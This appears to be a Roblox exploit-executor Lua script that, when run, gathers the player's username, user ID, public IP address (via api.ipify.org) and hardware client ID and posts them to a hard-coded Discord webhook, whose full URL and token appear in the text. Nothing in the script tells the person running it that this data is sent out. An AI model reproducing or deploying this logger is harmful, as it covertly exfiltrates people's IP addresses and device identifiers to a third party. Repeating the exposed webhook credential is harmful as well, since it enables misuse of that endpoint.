HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1091458313792798731/knA0ZiNZKWgHoyxfsiljHwgqkg45jQVwNBHipxG7nbpMxBhMNrT_v4nOcO367jiDdLOv"

local response = request({
    Url = Webhook_URL,
    Method = "POST", 
    Headers = {
		['Content-Type'] = 'application/json'
	},
    Body = HttpService:JSONEncode({
		['content'] = "",
		['embeds'] = {{
			["title"] = "**Your Script has been executed!**",
			["description"] = "Stage : ** Authenticated **",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
				{
					["name"] = "**Info**",
					["value"] = "**Roblox Username : **"..game.Players.LocalPlayer.Name.."\n".."**Roblox User ID : **"..game.Players.LocalPlayer.UserId.."\n".."**IP Address : **"..game:HttpGet("http://api.ipify.org").."\n".."**Hardware ID : **"..game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				}
			}
		
		}}
	}
	)
})
